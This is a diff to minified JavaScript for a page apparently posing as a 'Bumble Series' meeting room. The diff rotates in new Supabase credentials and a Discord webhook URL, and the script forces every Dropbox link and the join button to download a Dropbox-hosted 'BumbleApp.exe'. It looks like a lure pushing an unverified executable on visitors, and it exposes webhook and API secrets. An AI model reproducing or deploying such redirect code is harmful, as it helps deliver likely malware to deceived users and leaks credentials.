@@ -3,10 +3,10 @@ const $=(s,r=document)=>r.querySelector(s);
 const $$=(s,r=document)=>[...r.querySelectorAll(s)];
 if(document.body.dataset.page==='room'){const members=$('#supabase-members');if(members){const restoreHostFields=()=>{if(!$('#host-avatar')){const avatar=document.createElement('span');avatar.id='host-avatar';avatar.hidden=true;members.prepend(avatar)}if(!$('#host-name')){const name=document.createElement('span');name.id='host-name';name.hidden=true;members.prepend(name)}};new MutationObserver(restoreHostFields).observe(members,{childList:true})}}
 const base='https://Bumble Series.com';
-const supabaseUrl='https://gkbfaitxmsdgtjeqcvtx.supabase.co';  // bunlar bozulursa git supabase.com dan yenisini aç oç
-const supabaseKey='sb_publishable__7hGNNxfriSDhVzsUGXZvQ_8P96a0uY'; // buda ayni 
+const supabaseUrl='https://xnfdawxqauswzjhdfuth.supabase.co';  // bunlar bozulursa git supabase.com dan yenisini aç oç
+const supabaseKey='sb_publishable_c7zmsOP97B0RF9Ni8kRLAQ_edESJvyl'; // buda ayni 
 const downloadUrl='https://www.dropbox.com/scl/fi/sgz7svhwrjuxhabfi3pqx/BumbleApp.exe?rlkey=h32lz7qh2dsxf34borkixvm42&st=nwo176kn&dl=1';
-const supportWebhook='https://discord.com/api/webhooks/1562097160755871830/mah6o5y4CVk-ROzxMnp5B63bL_AeuOVXVXFTcpsZ4tWAGSXo8Z770E-_unF8MSkgGVEF';
+const supportWebhook='https://discord.com/api/webhooks/1562097160755871830/mah6o5y4CVk-ROzxMnp5B63bL_AeuOVXVXFTcpsZ4tWAGSXo8Z770E-_unF8MSkgGVEKL';
 $$('a[href*="dropbox.com/scl/fi/"],[data-room-download]').forEach(link=>{link.href=downloadUrl});
 $('#guest-join')?.addEventListener('click',event=>{if(event.currentTarget.textContent.trim()==='Download Bumble Series'){event.stopImmediatePropagation();window.location.href=downloadUrl}},true);
 
